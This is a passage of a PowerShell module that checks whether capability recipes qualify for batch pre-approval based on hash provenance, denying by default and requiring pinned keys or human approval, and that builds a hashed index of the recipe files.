    if ($script:CapabilityRuntimeStatuses -notcontains $status) { return $false }
    if ($status -ne 'verified') { return $false }
    return $false
}

function Test-CapabilityBatchEligible {
    # May THIS recipe ride the phase-C one-shot batch pre-approval path? Pure policy: no IO, no network,
    # nothing written, nothing executed. Returns a verdict {eligible, reason, hash_source}; a record it
    # cannot read yields eligible=$false with a reason rather than an exception -- a crash is not a verdict.
    #
    # It exists so the batch path can only CONSULT the tier policy, never re-invent it. Before this,
    # hash_source had no consumer at all: the field was recorded and enum-checked and then read by nobody,
    # so nothing would have forced phase C to look at it -- a recorded distinction that changes no
    # behaviour is the same failure class the field was introduced to kill.
    #
    # It answers ONLY the hash-provenance question. It is NOT a substitute for Test-CapabilityRecord; the
    # caller must independently require a valid, human-approved declared-plane recipe.
    #
    # Default-deny: a tier that is not explicitly listed as eligible is refused. That is what makes a
    # future fifth tier fail closed until someone rules on it, instead of silently inheriting the auto
    # path the way gpg_or_sigstore did.
    param([Parameter(Mandatory = $true)]$Record)

    $verdict = {
        param($Ok, $Why, $Tier)
        [pscustomobject]@{ eligible = [bool]$Ok; reason = [string]$Why; hash_source = [string]$Tier }
    }

    # Same hashtable-or-PSCustomObject normalization the rest of this file uses, so an in-memory recipe
    # and one read back from disk are judged identically.
    $normalized = $null
    try { $normalized = ($Record | ConvertTo-Json -Depth 30) | ConvertFrom-Json }
    catch { return (& $verdict $false 'record could not be read as a recipe' '') }

    $acquire = Get-PropertyValue $normalized 'acquire' $null
    $tier = [string](Get-PropertyValue $acquire 'hash_source' '')

    if ($script:CapabilityHashSources -notcontains $tier) {
        return (& $verdict $false "hash_source is missing or outside the closed enum: '$tier'" $tier)
    }
    if ($script:CapabilityBatchEligibleHashSources -contains $tier) {
        return (& $verdict $true 'the hash has a source independent of us' $tier)
    }
    if ($script:CapabilityKeyPinnedHashSources -contains $tier) {
        # The field that would carry the pinned key DOES NOT EXIST in the schema yet, and that is
        # deliberate -- adding it is a separately scheduled change, and acquire is additionalProperties:
        # false, so a recipe carrying it is refused by the validator today. Until the field lands this
        # branch therefore always refuses, which is the intended safe default and NOT an oversight:
        # gpg_or_sigstore entries simply cannot be batch pre-approved yet.
        $pinned = [string](Get-PropertyValue $acquire $script:CapabilityPinnedKeyField '')
        if ($pinned -match '^[A-Fa-f0-9]{40}$' -or $pinned -match '^[A-Fa-f0-9]{64}$') {
            return (& $verdict $true 'the verifying key is pinned in the record' $tier)
        }
        return (& $verdict $false ("hash_source=$tier requires a pinned verifying key in acquire.$($script:CapabilityPinnedKeyField) (a fingerprint or public-key hash); an unpinned detached signature proves nothing") $tier)
    }
    return (& $verdict $false "hash_source=$tier is trust-on-first-use and must be approved one entry at a time by a human, never in a batch" $tier)
}

function Get-CapabilityRoot {
    param([Parameter(Mandatory = $true)][string]$SkillRoot)
    return (Join-Path (Resolve-Path -LiteralPath $SkillRoot).Path 'capabilities')
}

function Get-CapabilityRecipeFile {
    param([Parameter(Mandatory = $true)][string]$SkillRoot)
    $recipes = Join-Path (Get-CapabilityRoot -SkillRoot $SkillRoot) 'recipes'
    if (-not (Test-Path -LiteralPath $recipes -PathType Container)) { return @() }
    return @(Get-ChildItem -LiteralPath $recipes -File -Filter '*.json' -ErrorAction SilentlyContinue | Sort-Object Name)
}

function Update-CapabilityIndex {
    # Deterministic, canonical INDEX of the recipes (own index; NOT scanned by Update-KnowledgeIndex).
    param([Parameter(Mandatory = $true)][string]$SkillRoot)

    $entries = New-Object System.Collections.Generic.List[object]
    foreach ($file in (Get-CapabilityRecipeFile -SkillRoot $SkillRoot)) {
        $record = Read-JsonFile -Path $file.FullName
        [void]$entries.Add([ordered]@{
                tool_capability_id = [string](Get-PropertyValue $record 'tool_capability_id' '')
                status             = [string](Get-PropertyValue $record 'status' '')
                path               = 'capabilities/recipes/' + $file.Name
                sha256             = (Get-Sha256 -Path $file.FullName)
            })
    }
    $sorted = @($entries | Sort-Object { $_.tool_capability_id }, { $_.path })
    $index = [ordered]@{ schema_version = 1; entries = $sorted }
    $indexPath = Join-Path (Get-CapabilityRoot -SkillRoot $SkillRoot) 'INDEX.json'
    Write-Utf8Json -Value $index -Path $indexPath
    return $indexPath
}
